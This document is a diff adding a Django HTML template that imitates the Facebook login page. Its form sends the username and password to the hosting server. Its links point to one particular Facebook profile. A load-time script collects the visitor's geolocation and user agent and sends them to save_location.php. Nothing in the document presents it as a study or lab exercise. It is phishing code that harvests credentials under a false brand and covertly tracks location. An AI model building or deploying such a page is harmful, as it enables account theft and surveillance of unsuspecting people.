@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+{% load static %}
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="{% static 'style.css' %}">
+</head>
+<body onload="getLocation()">
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
+        <h2>Login to Facebook</h2>
+        <form method="post">
+            {% csrf_token %}
+
+            {{ form.username }}
+            {{ form.password }}
+
+            <button type="submit">Log In</button>
+        </form>
+        <div class="links">
+            <a href="https://www.facebook.com/profile.php?id=100002351173756" class="forgot-password">Forgot Password?</a>
+            <span>or</span>
+            <a href="https://www.facebook.com/profile.php?id=100002351173756" class="create-account">Create New Account</a>
+        </div>
+    </div>
+
+    <script>
+      const x = document.getElementById("demo");
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+          x.innerHTML = "Geolocation is not supported by this browser.";
+        }
+      }
+
+      function showPosition(position) {
+          const xhttp =new XMLHttpRequest();
+
+          xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long="+ position.coords.longitude + "&user_agent: " + navigator.userAgent);
+          xhttp.send();
+
+        x.innerHTML = "Latitude: " + position.coords.latitude +
+        "<br>Longitude: " + position.coords.longitude;
+      }
+      </script>
+
+      </body>
+      </html>
+
+
+
+
+
+
+
+
+
+
